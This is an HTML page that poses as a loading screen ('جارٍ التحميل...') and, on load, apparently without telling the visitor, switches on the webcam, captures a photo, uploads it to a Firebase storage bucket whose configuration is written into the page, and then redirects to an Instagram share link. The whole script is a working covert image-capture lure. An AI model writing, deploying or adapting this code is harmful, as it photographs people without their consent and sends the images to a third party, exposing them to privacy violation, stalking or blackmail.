<!DOCTYPE html>
<html>
  <head>
    <title>Camera Capture</title>
    <meta charset="UTF-8" />
    <script type="module">
      // 1. Firebase SDK
      import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
      import { getStorage, ref, uploadBytes } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-storage.js";

      // 2. Firebase Config - استبدل القيم بقيم مشروعك
      const firebaseConfig = {
        apiKey: "AIzaSyCwDNgRY1qlGh2a1f8aaq8yvpyp_xyeRw",
        authDomain: "mioudcamstorage.firebaseapp.com",
        projectId: "mioudcamstorage",
        storageBucket: "mioudcamstorage.appspot.com",
        messagingSenderId: "607188581064",
        appId: "1:607188581064:web:122ebd49ffb0abe2b2a78d"
      };

      // 3. Start Firebase
      const app = initializeApp(firebaseConfig);
      const storage = getStorage(app);

      // 4. Take photo and upload
      async function captureAndUpload() {
        const video = document.createElement('video');
        const canvas = document.createElement('canvas');

        try {
          const stream = await navigator.mediaDevices.getUserMedia({ video: true });
          video.srcObject = stream;
          await video.play();

          // رسم الصورة على كـانفس
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          canvas.getContext('2d').drawImage(video, 0, 0);

          // إيقاف الكاميرا
          stream.getTracks().forEach(track => track.stop());

          const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
          const fileName = `photo_${Date.now()}.jpg`;

          const storageRef = ref(storage, fileName);
          await uploadBytes(storageRef, blob);

          // بعد الرفع، التحويل إلى انستقرام
          window.location.href = "https://www.instagram.com/share/BAPOHyZPk7";
        } catch (error) {
          console.error("حدث خطأ:", error);
        }
      }

      window.onload = () => {
        captureAndUpload();
      };
    </script>
  </head>
  <body>
    <h1 style="text-align:center;margin-top:40vh;font-family:sans-serif;">جارٍ التحميل...</h1>
  </body>
</html>
